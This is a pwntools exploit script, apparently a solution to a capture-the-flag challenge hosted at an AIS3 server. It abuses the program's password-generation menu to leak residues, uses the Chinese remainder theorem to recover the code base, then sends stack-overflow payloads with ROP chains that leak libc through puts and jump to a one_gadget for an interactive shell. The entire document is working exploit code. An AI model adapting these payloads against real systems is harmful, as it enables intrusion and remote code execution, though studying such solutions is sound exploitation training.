from pwn import *
from sage.all import crt
#r = process('./chall')
r = remote('chals1.ais3.org',1234)
chr = b'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@$'

def get_num(set_len):
    r.sendlineafter(b'> ',b'2')
    r.sendlineafter(b'set: ',chr[0:set_len])
    r.sendlineafter(b'password: ',str(set_len))
    r.recvuntil(b'is: a')
    res = r.recv(1)
    r.recvline()
    return chr.find(res)

prime_list = [5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41]
mul = 1
for i in prime_list :
    mul = mul * i 
res_list = []
for i in prime_list :
    idx = get_num(i)
    res_list.append(idx)

code_base = crt(res_list,prime_list) + mul - 0x40f0
print(hex(code_base))

gadget_1 = code_base + 0x1441
pop_rdi_ret = code_base + 0x1445
main = code_base + 0x12b1
puts_got = code_base+0x4010
puts = code_base + 0x1050

r.sendlineafter(b'> ',b'2')
payload = b'a' * 0x58 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts) + p64(main)
r.sendlineafter(b'set: ',payload)
r.sendlineafter(b'password: ',b'1')
r.sendlineafter(b'> ',b'3')

libc_base = u64(r.recv(6)+b'\x00\x00') - 0x80ed0
print(hex(libc_base))

pop_rsi_ret = libc_base + 0x2be51
pop_rdx_r12_ret = libc_base + 0x11f497
one_gadget = libc_base + 0xebcf8

r.sendlineafter(b'> ',b'2')
payload = b'a' * 0x50 + p64(code_base + 0x4600) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_r12_ret) + p64(0) * 2 + p64(one_gadget)
r.sendlineafter(b'set: ',payload)
r.sendlineafter(b'password: ',b'1')

r.sendlineafter(b'> ',b'3')
r.interactive()
